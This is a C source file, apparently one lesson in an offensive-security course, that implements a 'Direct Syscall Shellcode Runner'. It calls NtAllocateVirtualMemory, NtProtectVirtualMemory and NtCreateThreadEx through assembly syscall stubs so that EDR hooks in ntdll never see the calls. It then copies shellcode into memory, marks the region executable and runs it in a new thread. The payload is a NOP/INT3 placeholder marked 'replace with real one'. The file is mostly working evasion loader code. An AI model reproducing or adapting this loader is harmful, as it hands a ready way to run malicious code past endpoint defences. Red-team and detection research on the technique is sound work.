/*
 * 05_direct_syscall.c
 * ====================
 * Direct Syscall - Bypasses userland hooks
 *
 * Normally when you call NtAllocateVirtualMemory, the flow is:
 *   Your code -> ntdll.dll -> [EDR HOOK] -> kernel
 *
 * With direct syscall:
 *   Your code -> kernel (directly, without going through ntdll)
 *
 * The "syscall" is a processor instruction that transitions from Ring 3
 * (user) to Ring 0 (kernel). The number in EAX tells which kernel
 * function to execute (System Service Number - SSN).
 *
 * PROBLEM: SSNs change between Windows versions.
 * NtAllocateVirtualMemory can be 0x18 on Win10 21H2
 * and 0x19 on Win11. Tools like SysWhispers solve this.
 *
 * NOTE: this example uses inline assembly that works with MASM (ml64).
 * In production, use SysWhispers3 which generates the stubs automatically.
 *
 * Compile:
 *   ml64 /c syscall_stub.asm    (assemble the assembly)
 *   cl.exe /O2 05_direct_syscall.c syscall_stub.obj
 */

#include <windows.h>
#include <stdio.h>

/*
 * Prototypes for the Nt functions we'll call via direct syscall.
 *
 * NTSTATUS = return value (0 = success, negative = error)
 * NTAPI = calling convention (cdecl on x64)
 *
 * These functions exist in ntdll.dll but we'll bypass it
 * by calling the kernel directly via the syscall instruction.
 */

/* NtAllocateVirtualMemory - allocates memory in a process */
typedef NTSTATUS(NTAPI* fnNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,   /* process handle (-1 = current process) */
    PVOID* BaseAddress,     /* pointer to base address (in/out) */
    ULONG_PTR ZeroBits,     /* alignment bits (0 = default) */
    PSIZE_T RegionSize,     /* size of region to allocate */
    ULONG AllocationType,   /* MEM_COMMIT | MEM_RESERVE */
    ULONG Protect           /* permissions: PAGE_READWRITE, etc */
);

/* NtProtectVirtualMemory - changes memory permissions */
typedef NTSTATUS(NTAPI* fnNtProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,       /* new permission */
    PULONG OldProtect       /* previous permission (output) */
);

/* NtCreateThreadEx - creates a thread (Nt version, more powerful) */
typedef NTSTATUS(NTAPI* fnNtCreateThreadEx)(
    PHANDLE ThreadHandle,       /* receives the created thread handle */
    ACCESS_MASK DesiredAccess,  /* permissions (THREAD_ALL_ACCESS) */
    PVOID ObjectAttributes,     /* NULL = default */
    HANDLE ProcessHandle,       /* process where to create the thread */
    PVOID StartRoutine,         /* function to execute (our shellcode) */
    PVOID Argument,             /* parameter for the shellcode */
    ULONG CreateFlags,          /* 0 = start immediately */
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);


/*
 * These functions are implemented in assembly (syscall_stub.asm).
 * Each one does:
 *   mov r10, rcx        (Windows syscall convention: r10 = first arg)
 *   mov eax, <SSN>      (syscall number)
 *   syscall              (transition to kernel)
 *   ret                  (return to caller)
 *
 * EXTERN_C = visible to the C linker
 */
EXTERN_C NTSTATUS SyscallNtAllocateVirtualMemory(
    HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits,
    PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect
);

EXTERN_C NTSTATUS SyscallNtProtectVirtualMemory(
    HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize,
    ULONG NewProtect, PULONG OldProtect
);

EXTERN_C NTSTATUS SyscallNtCreateThreadEx(
    PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes,
    HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument,
    ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize,
    SIZE_T MaximumStackSize, PVOID AttributeList
);


int main() {

    printf("[*] Direct Syscall - Shellcode Runner\n\n");

    /* Shellcode placeholder (replace with real one) */
    unsigned char shellcode[] = {
        0x90, 0x90, 0x90, 0x90, /* NOP sled example */
        0xCC                     /* INT3 - breakpoint (for debugging) */
    };
    SIZE_T shellcodeSize = sizeof(shellcode);

    /* ---------------------------------------------------------------
     * STEP 1: Allocate memory via direct syscall
     *
     * GetCurrentProcess() returns -1 (pseudo-handle for current process).
     * No need for OpenProcess - we're allocating in ourselves.
     *
     * The crucial difference: this call does NOT go through ntdll.dll.
     * The EDR that hooked NtAllocateVirtualMemory in ntdll sees nothing.
     * --------------------------------------------------------------- */
    PVOID baseAddress = NULL;
    NTSTATUS status;

    status = SyscallNtAllocateVirtualMemory(
        GetCurrentProcess(),    /* current process */
        &baseAddress,           /* Windows fills in the address */
        0,                      /* no special alignment */
        &shellcodeSize,         /* size to allocate */
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE          /* RW first, change to RX later */
    );

    if (status != 0) {
        printf("[!] Allocation failed. NTSTATUS: 0x%08x\n", status);
        return 1;
    }
    printf("[+] Memory allocated (RW) at: 0x%p\n", baseAddress);

    /* Copy shellcode to allocated memory */
    memcpy(baseAddress, shellcode, sizeof(shellcode));
    printf("[+] Shellcode copied\n");

    /* ---------------------------------------------------------------
     * STEP 2: Change permission to RX via direct syscall
     * --------------------------------------------------------------- */
    ULONG oldPermission = 0;

    status = SyscallNtProtectVirtualMemory(
        GetCurrentProcess(),
        &baseAddress,
        &shellcodeSize,
        PAGE_EXECUTE_READ,   /* now can execute */
        &oldPermission
    );

    if (status != 0) {
        printf("[!] Failed to change permission. NTSTATUS: 0x%08x\n", status);
        return 1;
    }
    printf("[+] Permission changed to RX\n");

    /* ---------------------------------------------------------------
     * STEP 3: Create thread via direct syscall
     *
     * NtCreateThreadEx is the native version of CreateThread.
     * More powerful and less monitored than the high-level API.
     * --------------------------------------------------------------- */
    HANDLE hThread = NULL;

    status = SyscallNtCreateThreadEx(
        &hThread,             /* receives the thread handle */
        THREAD_ALL_ACCESS,    /* full permissions */
        NULL,                 /* no special attributes */
        GetCurrentProcess(),  /* create in current process */
        baseAddress,          /* function = our shellcode */
        NULL,                 /* no parameters */
        0,                    /* no flags (start immediately) */
        0, 0, 0,              /* default stack */
        NULL                  /* no attribute list */
    );

    if (status != 0) {
        printf("[!] Failed to create thread. NTSTATUS: 0x%08x\n", status);
        return 1;
    }

    printf("[+] Thread created via direct syscall!\n");
    printf("[*] No userland API was called via hooked ntdll.\n");

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    return 0;
}
